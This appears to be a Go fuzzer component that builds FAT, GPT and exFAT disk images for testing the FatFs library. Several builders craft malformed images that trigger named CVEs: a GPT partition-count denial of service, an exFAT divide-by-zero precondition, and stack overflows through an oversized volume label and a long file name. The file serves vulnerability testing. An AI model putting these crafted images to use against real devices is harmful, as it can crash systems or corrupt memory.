package main

// fat_image.go — FAT/GPT/exFAT disk image builders for the FatFs fuzzer.
//
// All multi-byte integers are stored little-endian, matching FAT on-disk
// format (exFAT and GPT also use little-endian for the fields we set).

import (
	"encoding/binary"
	"math/rand"
)

const (
	sectorSize = 512
)

// ── write helpers ──────────────────────────────────────────────────────────

func le16(b []byte, off int, v uint16) { binary.LittleEndian.PutUint16(b[off:], v) }
func le32(b []byte, off int, v uint32) { binary.LittleEndian.PutUint32(b[off:], v) }
func le64(b []byte, off int, v uint64) { binary.LittleEndian.PutUint64(b[off:], v) }

// maxDiskSectors caps image files so they fit in the test harness RAM disk.
const maxDiskSectors = 4096 // 2 MiB

// newDisk returns a zeroed byte slice of min(totalSectors, maxDiskSectors) * 512
// bytes.  Callers should still write the intended TotalSectors value into the
// appropriate BPB field so the filesystem metadata reflects the intended size.
func newDisk(totalSectors int) []byte {
	if totalSectors > maxDiskSectors {
		totalSectors = maxDiskSectors
	}
	return make([]byte, totalSectors*sectorSize)
}

// ──────────────────────────────────────────────────────────────────────────
// FAT16Builder
// ──────────────────────────────────────────────────────────────────────────

// FAT16Config holds parameters for a minimal FAT16 volume.
type FAT16Config struct {
	TotalSectors    uint16 // BPB_TotSec16
	SectorsPerClus  uint8  // BPB_SecPerClus  (must be power-of-2)
	ReservedSectors uint16 // BPB_RsvdSecCnt
	NumFATs         uint8  // BPB_NumFATs (1 or 2)
	FATSizeSectors  uint16 // BPB_FATSz16
	RootEntries     uint16 // BPB_RootEntCnt
	VolLabel        string // 11 bytes, space-padded
}

// DefaultFAT16Config returns a valid, minimal 1 MiB FAT16 configuration.
func DefaultFAT16Config() FAT16Config {
	return FAT16Config{
		TotalSectors:    2048,
		SectorsPerClus:  4,
		ReservedSectors: 1,
		NumFATs:         2,
		FATSizeSectors:  4,
		RootEntries:     64,
		VolLabel:        "FATFSTEST  ",
	}
}

// BuildFAT16 constructs a minimal FAT16 disk image from the given config.
func BuildFAT16(cfg FAT16Config) []byte {
	disk := newDisk(int(cfg.TotalSectors))
	vbr := disk

	vbr[0], vbr[1], vbr[2] = 0xEB, 0x3C, 0x90
	copy(vbr[3:11], "MSDOS5.0")

	le16(vbr, 11, sectorSize)
	vbr[13] = cfg.SectorsPerClus
	le16(vbr, 14, cfg.ReservedSectors)
	vbr[16] = cfg.NumFATs
	le16(vbr, 17, cfg.RootEntries)
	le16(vbr, 19, cfg.TotalSectors)
	vbr[21] = 0xF8
	le16(vbr, 22, cfg.FATSizeSectors)
	le16(vbr, 24, 63)
	le16(vbr, 26, 255)
	le32(vbr, 28, 0)
	le32(vbr, 32, 0)

	vbr[36] = 0x80
	vbr[38] = 0x29
	le32(vbr, 39, 0xCAFEBABE)
	label := cfg.VolLabel
	for len(label) < 11 {
		label += " "
	}
	copy(vbr[43:54], label[:11])
	copy(vbr[54:62], "FAT16   ")
	le16(vbr, 510, 0xAA55)

	fatStart := int(cfg.ReservedSectors)
	for f := 0; f < int(cfg.NumFATs); f++ {
		fatOff := (fatStart + f*int(cfg.FATSizeSectors)) * sectorSize
		le16(disk, fatOff+0, 0xFFF8)
		le16(disk, fatOff+2, 0xFFFF)
	}

	return disk
}

// FAT16DataSector returns the first sector of cluster c (c >= 2).
func FAT16DataSector(cfg FAT16Config, c uint16) int {
	rootDirSecs := int(cfg.RootEntries) * 32 / sectorSize
	sysSecs := int(cfg.ReservedSectors) + int(cfg.NumFATs)*int(cfg.FATSizeSectors) + rootDirSecs
	return sysSecs + int(c-2)*int(cfg.SectorsPerClus)
}

// ──────────────────────────────────────────────────────────────────────────
// FAT32Builder
// ──────────────────────────────────────────────────────────────────────────

// FAT32Config holds parameters for a minimal FAT32 volume.
type FAT32Config struct {
	TotalSectors    uint32
	SectorsPerClus  uint8
	ReservedSectors uint16
	NumFATs         uint8
	FATSz32         uint32
	RootCluster     uint32
	VolLabel        string
}

// DefaultFAT32Config returns a valid FAT32 configuration sized to fit in the
// test harness RAM disk (4096 sectors = 2 MiB).  BPB_TotSec32 still reflects
// the full claimed size; actual bytes on disk are capped to 2 MiB.
func DefaultFAT32Config() FAT32Config {
	return FAT32Config{
		TotalSectors:    4096, // capped to harness RAM disk size
		SectorsPerClus:  1,
		ReservedSectors: 4,
		NumFATs:         2,
		FATSz32:         64,
		RootCluster:     2,
		VolLabel:        "FATFSTEST  ",
	}
}

// BuildFAT32 constructs a minimal FAT32 disk image.
func BuildFAT32(cfg FAT32Config) []byte {
	disk := newDisk(int(cfg.TotalSectors))
	vbr := disk

	vbr[0], vbr[1], vbr[2] = 0xEB, 0x58, 0x90
	copy(vbr[3:11], "MSDOS5.0")

	le16(vbr, 11, sectorSize)
	vbr[13] = cfg.SectorsPerClus
	le16(vbr, 14, cfg.ReservedSectors)
	vbr[16] = cfg.NumFATs
	le16(vbr, 17, 0) // BPB_RootEntCnt = 0 for FAT32
	le16(vbr, 19, 0) // BPB_TotSec16 = 0
	vbr[21] = 0xF8
	le16(vbr, 22, 0) // BPB_FATSz16 = 0
	le16(vbr, 24, 63)
	le16(vbr, 26, 255)
	le32(vbr, 28, 0)
	le32(vbr, 32, cfg.TotalSectors)

	le32(vbr, 36, cfg.FATSz32)
	le16(vbr, 40, 0)
	le16(vbr, 42, 0) // BPB_FSVer32 = 0.0
	le32(vbr, 44, cfg.RootCluster)
	le16(vbr, 48, 0) // BPB_FSInfo32 disabled
	le16(vbr, 50, 0)

	vbr[64] = 0x80
	vbr[66] = 0x29
	le32(vbr, 67, 0xDEADC0DE)
	label := cfg.VolLabel
	for len(label) < 11 {
		label += " "
	}
	copy(vbr[71:82], label[:11])
	copy(vbr[82:90], "FAT32   ")
	le16(vbr, 510, 0xAA55)

	fatStart := int(cfg.ReservedSectors)
	for f := 0; f < int(cfg.NumFATs); f++ {
		fatOff := (fatStart + f*int(cfg.FATSz32)) * sectorSize
		if fatOff+12 > len(disk) {
			break
		}
		le32(disk, fatOff+0, 0x0FFFFFF8)
		le32(disk, fatOff+4, 0x0FFFFFFF)
		le32(disk, fatOff+8, 0x0FFFFFFF) // cluster 2: EOC (root)
	}

	return disk
}

// ──────────────────────────────────────────────────────────────────────────
// GPT image builder
// ──────────────────────────────────────────────────────────────────────────

// guidMSBasicData is the partition type GUID for "Microsoft Basic Data".
// find_volume() only counts partitions whose type GUID matches this value.
var guidMSBasicData = [16]byte{
	0xA2, 0xA0, 0xD0, 0xEB, 0xE5, 0xB9, 0x33, 0x44,
	0x87, 0xC0, 0x68, 0xB6, 0xB7, 0x26, 0x99, 0xC7,
}

// BuildGPTImage constructs a disk image with a GPT-protective MBR,
// a GPT header at sector 1 declaring nPartitions entries, and
// nMSBDP entries whose PartTypeGUID matches guidMSBasicData.
//
// When nMSBDP == 0 the loop in find_volume() iterates nPartitions times
// without finding a match, then returns "not found".  With nPartitions =
// 0xFFFFFFFF this causes ~268 million disk reads on real hardware (DoS).
func BuildGPTImage(totalSectors int, nPartitions uint32, nMSBDP uint32) []byte {
	disk := newDisk(totalSectors)

	// protective MBR
	mbr := disk
	mbr[446+4] = 0xEE
	le32(mbr, 446+8, 1)
	le32(mbr, 446+12, 0xFFFFFFFF)
	le16(mbr, 510, 0xAA55)

	// GPT header at sector 1
	gpt := disk[sectorSize:]
	copy(gpt[0:8], "EFI PART")
	le32(gpt, 8, 0x00010000)
	le32(gpt, 12, 92)
	le32(gpt, 16, 0) // BCC not verified by find_volume
	le64(gpt, 24, 1)
	le64(gpt, 32, uint64(totalSectors-1))
	le64(gpt, 40, 34)
	le64(gpt, 48, uint64(totalSectors-1))
	// DiskGUID: 16 zero bytes
	le64(gpt, 72, 2)               // partition table at sector 2
	le32(gpt, 80, nPartitions)     // GPTH_PtNum ← CRAFTED
	le32(gpt, 84, 128)             // SZ_GPTE
	le32(gpt, 88, 0)

	// partition entries (128 bytes each, 4 per sector)
	entryBase := 2 * sectorSize
	for i := uint32(0); i < nMSBDP; i++ {
		off := entryBase + int(i)*128
		if off+128 > len(disk) {
			break
		}
		copy(disk[off:off+16], guidMSBasicData[:])
		le64(disk, off+32, 34)
		le64(disk, off+40, uint64(totalSectors-1))
	}

	return disk
}

// ──────────────────────────────────────────────────────────────────────────
// exFAT image builder
// ──────────────────────────────────────────────────────────────────────────

// BuildExFATImage creates a minimal exFAT VBR.
// When numClusters == 0, n_fatent becomes 2 in FatFs, which is the
// divide-by-zero precondition in sync_fs() (CVE-2026-6683).
func BuildExFATImage(totalSectors int, numClusters uint32) []byte {
	disk := newDisk(totalSectors)
	vbr := disk

	vbr[0], vbr[1], vbr[2] = 0xEB, 0x76, 0x90
	copy(vbr[3:11], "EXFAT   ")
	// bytes 11..63: MBZ (already zero)

	le64(vbr, 64, 0)
	le64(vbr, 72, uint64(totalSectors))
	le32(vbr, 80, 24) // BPB_FatOfsEx
	le32(vbr, 84, 1)  // BPB_FatSzEx
	le32(vbr, 88, 25) // BPB_DataOfsEx
	le32(vbr, 92, numClusters) // BPB_NumClusEx ← CRAFTED
	le32(vbr, 96, 2)  // BPB_RootClusEx
	le32(vbr, 100, 0xABCD1234)
	le16(vbr, 104, 0x0100) // BPB_FSVerEx = 1.0
	le16(vbr, 106, 0)
	vbr[108] = 9    // BPB_BytsPerSecEx: 2^9 = 512
	vbr[109] = 0    // BPB_SecPerClusEx: 2^0 = 1
	vbr[110] = 1    // BPB_NumFATsEx
	vbr[112] = 0xFF // BPB_PercInUseEx: unknown
	le16(vbr, 510, 0xAA55)

	// FAT at sector 24
	fatOff := 24 * sectorSize
	if fatOff+12 <= len(disk) {
		le32(disk, fatOff+0, 0xFFFFFFF8)
		le32(disk, fatOff+4, 0xFFFFFFFF)
		le32(disk, fatOff+8, 0x7FFFFFFF) // cluster 2: EOC
	}

	return disk
}

// ──────────────────────────────────────────────────────────────────────────
// Mutation helpers
// ──────────────────────────────────────────────────────────────────────────

// MutateFAT32BPB returns a copy of a FAT32 disk image with the named BPB
// field set to value.
func MutateFAT32BPB(disk []byte, field string, value uint32) []byte {
	out := make([]byte, len(disk))
	copy(out, disk)
	switch field {
	case "BPB_FATSz32":
		le32(out, 36, value)
	case "BPB_NumFATs":
		out[16] = byte(value)
	case "BPB_SecPerClus":
		out[13] = byte(value)
	case "BPB_RsvdSecCnt":
		le16(out, 14, uint16(value))
	case "BPB_TotSec32":
		le32(out, 32, value)
	case "BPB_RootClus32":
		le32(out, 44, value)
	}
	return out
}

// RandomMutate applies a single random byte-flip to a copy of disk.
func RandomMutate(disk []byte, rng *rand.Rand) []byte {
	out := make([]byte, len(disk))
	copy(out, disk)
	if len(out) == 0 {
		return out
	}
	pos := rng.Intn(len(out))
	out[pos] ^= byte(1 + rng.Intn(255))
	return out
}

// ──────────────────────────────────────────────────────────────────────────
// exFAT image with crafted volume label (CVE-2026-6687)
// ──────────────────────────────────────────────────────────────────────────

// BuildExFATWithLargeLabel creates a minimal mountable exFAT disk image whose
// volume-label directory entry has XDIR_NumLabel set to numLabel.
//
// The exFAT spec limits XDIR_NumLabel to 11 characters.  FatFs reads it as a
// raw BYTE (0-255) and uses it directly as a loop count in f_getlabel() with
// no spec-compliance check.  A caller using a typical char label[24] stack
// buffer gets overflowed when numLabel > 23.
//
// Image layout:
//   Sector  0: exFAT VBR
//   Sector 24: FAT (clusters 0-3: media / EOC / root-EOC / bitmap-EOC)
//   Sector 25: root directory
//     entry 0 (offset  0): Allocation Bitmap  (ET_BITMAP=0x81, clus=3)
//     entry 1 (offset 32): Volume Label       (ET_VLABEL=0x83, NumLabel=crafted)
//   Sector 26: allocation bitmap data (all-zero = no clusters in use)
func BuildExFATWithLargeLabel(totalSectors int, numLabel uint8) []byte {
	const (
		fatSector   = 24
		dataSector  = 25
		rootClus    = 2
		bitmapClus  = 3
		numClusters = 10 // BPB_NumClusEx; n_fatent = 12
	)

	disk := newDisk(totalSectors)
	vbr := disk

	// exFAT VBR
	vbr[0], vbr[1], vbr[2] = 0xEB, 0x76, 0x90
	copy(vbr[3:11], "EXFAT   ")
	// bytes 11..63: BPB_ZeroedEx — must remain zero (newDisk zeroes all)
	le64(vbr, 64, 0)
	le64(vbr, 72, uint64(totalSectors))
	le32(vbr, 80, fatSector)   // BPB_FatOfsEx
	le32(vbr, 84, 1)           // BPB_FatSzEx  = 1 sector
	le32(vbr, 88, dataSector)  // BPB_DataOfsEx
	le32(vbr, 92, numClusters) // BPB_NumClusEx
	le32(vbr, 96, rootClus)    // BPB_RootClusEx
	le32(vbr, 100, 0xBEEF1234)
	le16(vbr, 104, 0x0100) // BPB_FSVerEx = 1.0
	vbr[108] = 9            // BPB_BytsPerSecEx: 2^9 = 512
	vbr[109] = 0            // BPB_SecPerClusEx: 2^0 = 1 sec/clus
	vbr[110] = 1            // BPB_NumFATsEx = 1
	vbr[112] = 0xFF         // BPB_PercInUseEx
	le16(vbr, 510, 0xAA55)

	// FAT (sector 24)
	fatOff := fatSector * sectorSize
	le32(disk, fatOff+0, 0xFFFFFFF8)  // cluster 0: media
	le32(disk, fatOff+4, 0xFFFFFFFF)  // cluster 1: EOC (reserved)
	le32(disk, fatOff+8, 0xFFFFFFFF)  // cluster 2 (root): EOC
	le32(disk, fatOff+12, 0xFFFFFFFF) // cluster 3 (bitmap): EOC — single-cluster, contiguous

	// Root directory (sector 25 = cluster 2)
	rootOff := dataSector * sectorSize

	// Entry 0: Allocation Bitmap (required by exFAT mount validation)
	disk[rootOff+0] = 0x81 // ET_BITMAP
	disk[rootOff+1] = 0x01 // GeneralSecondaryFlags (AllocPossible=1, NoFatChain=1)
	// bytes 2..19: reserved (zero)
	le32(disk, rootOff+20, bitmapClus)
	le64(disk, rootOff+24, 2) // DataLength = ceil(numClusters/8) = 2 bytes

	// Entry 1: Volume Label (ET_VLABEL = 0x83) — the crafted overflow trigger
	labOff := rootOff + 32
	disk[labOff+0] = 0x83    // ET_VLABEL
	disk[labOff+1] = numLabel // XDIR_NumLabel ← CRAFTED (spec max: 11)

	// Write UTF-16LE 'A' chars up to where sector 25 ends (prevents disk image
	// corruption due to fs->win OOB), while keeping the XDIR_NumLabel header
	// field at the full crafted value so FatFs still loops numLabel times.
	maxChars := (sectorSize - 34) / 2 // chars that fit in remaining sector space
	nWrite := int(numLabel)
	if nWrite > maxChars {
		nWrite = maxChars
	}
	for i := 0; i < nWrite; i++ {
		disk[labOff+2+i*2+0] = 'A'  // UTF-16LE low byte
		disk[labOff+2+i*2+1] = 0x00 // UTF-16LE high byte
	}

	// Sector 26 = cluster 3 = allocation bitmap: all-zero (no clusters in use)
	return disk
}

// ──────────────────────────────────────────────────────────────────────────
// FAT16 image with a long LFN file entry (CVE-2026-6688)
// ──────────────────────────────────────────────────────────────────────────

// sfnChecksum computes the LFN checksum of an 11-byte FAT SFN (matching
// sum_sfn() in ff.c).
func sfnChecksum(name [11]byte) byte {
	var sum byte
	for _, c := range name {
		sum = (sum>>1 | sum<<7) + c
	}
	return sum
}

// lfnCharOffsets are the byte offsets of the 13 UTF-16LE characters within
// a 32-byte FAT LFN directory entry (matches LfnOfs[] in ff.c).
var lfnCharOffsets = [13]int{1, 3, 5, 7, 9, 14, 16, 18, 20, 22, 24, 28, 30}

// BuildFAT16WithLFNFile returns a FAT16 image identical to BuildFAT16(cfg)
// but with one file in the root directory whose LFN is lfnName.
//
// len(lfnName) should be between 1 and 255.  The SFN is derived from the
// first 6 chars of lfnName uppercased + "~1", padded with spaces.
//
// This image is used to exercise the CVE-2026-6688 path: f_readdir returns
// fno.fname = lfnName (up to 255 chars), and callers using a small stack
// buffer for path construction get overflowed.
func BuildFAT16WithLFNFile(cfg FAT16Config, lfnName string) []byte {
	disk := BuildFAT16(cfg)

	if len(lfnName) == 0 || len(lfnName) > 255 {
		return disk
	}

	// Build SFN: first 6 chars of LFN (uppercased, ASCII only) + "~1" + "   "
	var sfn [11]byte
	for i := range sfn {
		sfn[i] = ' '
	}
	bodyLen := len(lfnName)
	if bodyLen > 6 {
		bodyLen = 6
	}
	for i := 0; i < bodyLen; i++ {
		c := lfnName[i]
		if c >= 'a' && c <= 'z' {
			c -= 0x20
		}
		sfn[i] = c
	}
	sfn[6] = '~'
	sfn[7] = '1'
	// extension: 3 spaces (already set)

	cksum := sfnChecksum(sfn)

	// Number of LFN entries needed
	nLFN := (len(lfnName) + 12) / 13

	// Root directory sector offset
	rootDirSecs := int(cfg.RootEntries) * 32 / sectorSize
	sysSecs := int(cfg.ReservedSectors) + int(cfg.NumFATs)*int(cfg.FATSizeSectors) + rootDirSecs
	rootOff := int(cfg.ReservedSectors+uint16(cfg.NumFATs)*cfg.FATSizeSectors) * sectorSize

	// Check we have enough root directory entries
	totalEntries := nLFN + 1
	if totalEntries > int(cfg.RootEntries) {
		return disk // not enough space
	}

	// Encode LFN as UTF-16LE rune slice (ASCII-only for simplicity)
	lfnRunes := make([]uint16, len(lfnName)+1)
	for i, c := range lfnName {
		lfnRunes[i] = uint16(c)
	}
	lfnRunes[len(lfnName)] = 0 // null terminator

	// Write LFN entries in physical order: seq=nLFN|LLEF first, then nLFN-1 … 1
	for seq := nLFN; seq >= 1; seq-- {
		entryOff := rootOff + (nLFN-seq)*32
		e := disk[entryOff : entryOff+32]
		for i := range e {
			e[i] = 0xFF // pre-fill filler
		}
		ord := byte(seq)
		if seq == nLFN {
			ord |= 0x40 // LLEF
		}
		e[0] = ord
		e[11] = 0x0F // AM_LFN attribute
		e[12] = 0x00 // LDIR_Type
		e[13] = cksum
		e[26] = 0x00 // LDIR_FstClusLO must be 0
		e[27] = 0x00

		for ci, off := range lfnCharOffsets {
			nameIdx := (seq-1)*13 + ci
			var wc uint16
			switch {
			case nameIdx < len(lfnName):
				wc = lfnRunes[nameIdx]
			case nameIdx == len(lfnName):
				wc = 0x0000 // null terminator
			default:
				wc = 0xFFFF // filler beyond null
			}
			e[off] = byte(wc)
			e[off+1] = byte(wc >> 8)
		}
	}

	// SFN entry (follows the LFN entries)
	sfnOff := rootOff + nLFN*32
	sfnEnt := disk[sfnOff : sfnOff+32]
	for i := range sfnEnt {
		sfnEnt[i] = 0
	}
	copy(sfnEnt[0:11], sfn[:])
	sfnEnt[11] = 0x20  // AM_ARC
	sfnEnt[26] = 0x02  // FirstCluster low = 2
	sfnEnt[27] = 0x00  // FirstCluster high = 0
	le32(sfnEnt, 28, 64) // FileSize = 64 bytes

	// FAT entry: cluster 2 = EOC
	for f := 0; f < int(cfg.NumFATs); f++ {
		fatOff := (int(cfg.ReservedSectors) + f*int(cfg.FATSizeSectors)) * sectorSize
		le16(disk, fatOff+4, 0xFFFF) // cluster 2: EOC
	}

	// File data at the first data cluster (cluster 2)
	fstDataSec := sysSecs
	copy(disk[fstDataSec*sectorSize:fstDataSec*sectorSize+64],
		[]byte("FATFS-BUG7-LFN-OVERFLOW-TEST-DATA-PADDING-PADDING-PADDING-PADDIN"))

	return disk
}

